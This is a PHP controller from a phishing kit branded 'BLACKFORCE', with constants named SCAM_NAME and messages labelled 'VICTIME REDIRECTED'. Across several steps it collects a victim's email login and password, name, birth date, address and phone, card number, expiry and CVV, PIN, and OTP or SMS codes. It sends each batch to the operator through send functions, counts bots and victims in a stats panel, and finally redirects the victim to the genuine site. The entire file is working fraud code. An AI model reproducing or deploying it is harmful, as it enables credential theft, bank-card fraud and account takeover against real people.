<?php
require_once 'model/app.php';

function check() {
    // Validate hCAPTCHA checkbox 
    if(!empty($_POST['h-captcha-response'])){ 
        // Verify API URL 
        $verifyURL = 'https://hcaptcha.com/siteverify'; 
         
        // Retrieve token from post data with key 'h-captcha-response' 
        $token = $_POST['h-captcha-response']; 
         
        // Build payload with secret key and token 
        $data = array( 
            'secret' => SECRETKEY, 
            'response' => $token, 
            'remoteip' => $_SERVER['REMOTE_ADDR'] 
        ); 
         
        // Initialize cURL request 
        // Make POST request with data payload to hCaptcha API endpoint 
        $curlConfig = array( 
            CURLOPT_URL => $verifyURL, 
            CURLOPT_POST => true, 
            CURLOPT_RETURNTRANSFER => true, 
            CURLOPT_POSTFIELDS => $data 
        ); 
        $ch = curl_init(); 
        curl_setopt_array($ch, $curlConfig); 
        $response = curl_exec($ch); 
        curl_close($ch); 
         
        // Parse JSON from response. Check for success or error codes 
        $responseData = json_decode($response); 
         
        // If reCAPTCHA response is valid 
        if($responseData->success){ 
            header("Location: index.php?view=main&id=" . md5(time()));
            $statusMsg = 'Your contact request has submitted successfully.';
        }else{ 
            $file = 'Panel/stats/stats.ini';
            $data = @parse_ini_file($file);
            $data['bots']++;
            update_ini($data, $file);
            die("USER NOT ALLOWED");
            $statusMsg = 'Robot verification failed, please try again.'; 
        } 
    }else{ 
        $_SESSION['ERRORS']['captcha'] = "Invalid OTP.";
        header("Location: index.php?view=index&id=" . md5(time()));
        $statusMsg = 'Please check on the CAPTCHA box.'; 
    } 
}

function index() {

    if(!isset($_SESSION)) {
        session_start();
    }

$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['ERRORS'] = [];

$requiredFields = ['user', 'pass'];

foreach ($requiredFields as $field) {
    if (isset($_POST[$field])) {
        $_SESSION['s' . $field] = htmlspecialchars($_POST[$field]);
        if ($field === 'user' && !filter_var($_SESSION['s' . $field], FILTER_VALIDATE_EMAIL)) {
            $_SESSION['ERRORS']['user'] = "Please enter a valid email address.";
        } elseif (empty($_SESSION['s' . $field])) {
            $_SESSION['ERRORS'][$field] = "Please enter a valid $field.";
        }
    } else {
        // Handle the case where a field is not set in the POST data
        $_SESSION['ERRORS'][$field] = "Field $field is missing in the form submission.";
    }
}

// Check if any of the required fields are empty
if (!empty($_SESSION['ERRORS'])) {
    header("Location: index.php?view=main&id=" . md5(time()));
    exit;
}
else {
     
$rezdata = "🔐 LOGIN ".SCAM_NAME." ".FLAG."

🔑 USER : ".$_SESSION['suser']."
🔒 PASS : ".$_SESSION['spass']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    send($rezdata);

    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['logs']++;
    update_ini($data, $file);

    header("Location: index.php?view=explain&id=".md5(time()));
    exit;
}
}

function Explain() {
    header("Location: index.php?view=infoz&id=".md5(time()));
    exit;
}

function Infoz() {

    if(!isset($_SESSION)) {
        session_start();
    }

$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['ERRORS'] = [];

$requiredFields = ['name', 'dob', 'adress', 'zip', 'city', 'phone'];

foreach ($requiredFields as $field) {
    if (isset($_POST[$field])) {
        $_SESSION['s' . $field] = htmlspecialchars($_POST[$field]);
        if (empty($_SESSION['s' . $field])) {
            $_SESSION['ERRORS'][$field] = "Please enter a valid $field.";
        }
    } else {
        // Handle the case where a field is not set in the POST data
        $_SESSION['ERRORS'][$field] = "Field $field is missing in the form submission.";
    }
}

// Check if any of the required fields are empty
if (!empty($_SESSION['ERRORS'])) {
    header("Location: index.php?view=infoz&id=" . md5(time()));
    exit;
}
else {
     
$rezdata = "🥷🏻 INFOZ ".SCAM_NAME." ".FLAG."

🥷🏻 NAME : ".$_SESSION['sname']."
🥷🏻 DOB : ".$_SESSION['sdob']."
🥷🏻 ADRESS : ".$_SESSION['sadress']."
🥷🏻 PHONE : ".$_SESSION['sphone']."
🥷🏻 CITY : ".$_SESSION['scity']."
🥷🏻 ZIP : ".$_SESSION['szip']."

🔑 USER : ".$_SESSION['suser']."
🔒 PASS : ".$_SESSION['spass']."


⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    if (NOTIF) sendnotif($rezdata);

    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['infos']++;
    update_ini($data, $file);

    header("Location: index.php?view=pay&id=".md5(time()));
    exit;
}
}




function Otp() {

    if(!isset($_SESSION)) {
        session_start();
    }

//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['ERRORS'] = [];

$requiredFields = ['otp'];

foreach ($requiredFields as $field) {
    if (isset($_POST[$field])) {
        $_SESSION['s' . $field] = htmlspecialchars($_POST[$field]);
        if (empty($_SESSION['s' . $field])) {
            $_SESSION['ERRORS'][$field] = "Please enter a valid $field.";
        }
    } else {
        // Handle the case where a field is not set in the POST data
        $_SESSION['ERRORS'][$field] = "Field $field is missing in the form submission.";
    }
}

// Check if any of the required fields are empty
if (!empty($_SESSION['ERRORS'])) {
    header("Location: index.php?view=otp&id=" . md5(time()));
    exit;
}
else {
     
$rezdata = "📲 OTP ".SCAM_NAME." ".FLAG."

📲 Otp : ".$_SESSION['sotp']."

💳 number : ".$_SESSION['scan']."
💳 Expiration : ".$_SESSION['sexp']."
💳 Code Cvv : ".$_SESSION['scvv']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    send($rezdata);
    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['otps']++;
    update_ini($data, $file);
    header("Location: index.php?view=load&id=".md5(time()));
    exit;
}
}

function Sms() {

    if(!isset($_SESSION)) {
        session_start();
    }

//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['ERRORS'] = [];

$requiredFields = ['sms'];

foreach ($requiredFields as $field) {
    if (isset($_POST[$field])) {
        $_SESSION['s' . $field] = htmlspecialchars($_POST[$field]);
        if (empty($_SESSION['s' . $field])) {
            $_SESSION['ERRORS'][$field] = "Please enter a valid $field.";
        }
    } else {
        // Handle the case where a field is not set in the POST data
        $_SESSION['ERRORS'][$field] = "Field $field is missing in the form submission.";
    }
}

// Check if any of the required fields are empty
if (!empty($_SESSION['ERRORS'])) {
    header("Location: index.php?view=sms&id=" . md5(time()));
    exit;
}
else {
     
$rezdata = "📲 SMS ".SCAM_NAME." ".FLAG."

📲 Sms : ".$_SESSION['ssms']."

💳 number : ".$_SESSION['scan']."
💳 Expiration : ".$_SESSION['sexp']."
💳 Code Cvv : ".$_SESSION['scvv']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    send($rezdata);
    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['otps']++;
    update_ini($data, $file);
    header("Location: index.php?view=load&id=".md5(time()));
    exit;
}
}

function Pin() {

    if(!isset($_SESSION)) {
        session_start();
    }

//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['ERRORS'] = [];

$requiredFields = ['pin'];

foreach ($requiredFields as $field) {
    if (isset($_POST[$field])) {
        $_SESSION['s' . $field] = htmlspecialchars($_POST[$field]);
        if (empty($_SESSION['s' . $field])) {
            $_SESSION['ERRORS'][$field] = "Please enter a valid $field.";
        }
    } else {
        // Handle the case where a field is not set in the POST data
        $_SESSION['ERRORS'][$field] = "Field $field is missing in the form submission.";
    }
}

// Check if any of the required fields are empty
if (!empty($_SESSION['ERRORS'])) {
    header("Location: index.php?view=pin&id=" . md5(time()));
    exit;
}
else {
     
$rezdata = "🔐 PIN ".SCAM_NAME." ".FLAG."

🔐 PIN : ".$_SESSION['spin']."

💳 number : ".$_SESSION['scan']."
💳 Expiration : ".$_SESSION['sexp']."
💳 Code Cvv : ".$_SESSION['scvv']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    send($rezdata);
    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['pins']++;
    update_ini($data, $file);
    header("Location: index.php?view=load&id=".md5(time()));
    exit;
}
}

function Pay() {

    if(!isset($_SESSION)) {
        session_start();
    }
//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

// Initialize the ERRORS array
$_SESSION['ERRORS'] = [];

$requiredFields = ['ccn', 'exp', 'cvv'];

foreach ($requiredFields as $field) {
    if (isset($_POST[$field])) {
        $value = htmlspecialchars($_POST[$field]);
        $_SESSION['s' . $field] = $value;

        switch ($field) {
            case 'ccn':
                $value = str_replace(" ", "", $value);
                $numberLength = strlen($value);
                if (!is_valid_luhn($value) || empty($value) || $numberLength !== 16 || intval($value) < 16) {
                    $_SESSION['ERRORS']['ccn'] = "Invalid credit card number.";
                }
                break;
            case 'exp':
                $expirationYear = substr($value, -2);
                if ((int) $expirationYear < 23 || empty($value)) {
                    $_SESSION['ERRORS']['exp'] = "Invalid expiration year.";
                }
                break;
            case 'cvv':
                if (!is_numeric($value) || empty($value)) {
                    $_SESSION['ERRORS']['cvv'] = "Invalid CVV.";
                }
                break;
            default:
                if (empty($value)) {
                    $_SESSION['ERRORS'][$field] = "Please enter a valid $field.";
                }
        }
    } else {
        // Handle the case where a field is not set in the POST data
        $_SESSION['ERRORS'][$field] = "Field $field is missing in the form submission.";
    }
}

// Check if any of the required fields have errors
if (!empty($_SESSION['ERRORS'])) {
    $errorQueryString = http_build_query(['id' => md5(time())]);
    header("Location: index.php?view=pay&" . $errorQueryString);
    exit;
}
else {   

$_SESSION['scan'] =  str_replace(" ", "", $_SESSION['sccn']);
BinCheck($_SESSION['scan']);


$rezdata = "💳 CARD ".SCAM_NAME." ".FLAG."

💳 Number : ".$_SESSION['scan']."
💳 Expiration : ".$_SESSION['sexp']."
💳 Code Cvv : ".$_SESSION['scvv']."

🏛️ BANK INFO'S ".SCAM_NAME." ".FLAG." 🏛️

🏛️ Banque : ".$_SESSION['bank']."
🏛️ Niveau : ".$_SESSION['level']."
🏛️ Type : ".$_SESSION['type']."
🏛️ Pays : ".$_SESSION['country']."

🥷🏻 INFOZ ".SCAM_NAME." ".FLAG." 🥷🏻

🥷🏻 NAME : ".$_SESSION['sname']."
🥷🏻 DOB : ".$_SESSION['sdob']."
🥷🏻 ADRESS : ".$_SESSION['sadress']."
🥷🏻 PHONE : ".$_SESSION['sphone']."
🥷🏻 CITY : ".$_SESSION['scity']."
🥷🏻 ZIP : ".$_SESSION['szip']."

🔑 USER : ".$_SESSION['suser']."
🔒 PASS : ".$_SESSION['spass']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    sendCard($rezdata);


    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['cards']++;
    update_ini($data, $file);

    if (CONTROLLER) {
        header("Location: index.php?view=load&id=".md5(time()));
        exit;
    } else {
        header("Location: index.php?view=confirm&id=".md5(time()));
        exit;
    }
}
}

function Conf() {
    if(!isset($_SESSION)) {
        session_start();
    }
//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];;

$_SESSION['ERRORS'] = [];

     
$rezdata = "🥷🏻 VICTIME REDIRECTED ".SCAM_NAME." ".FLAG."

🔑 USER : ".$_SESSION['suser']."
🔒 PASS : ".$_SESSION['spass']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    if (NOTIF) sendnotif($rezdata);


    session_destroy();
    header("Location: ".WEBSITE);
    exit;
}
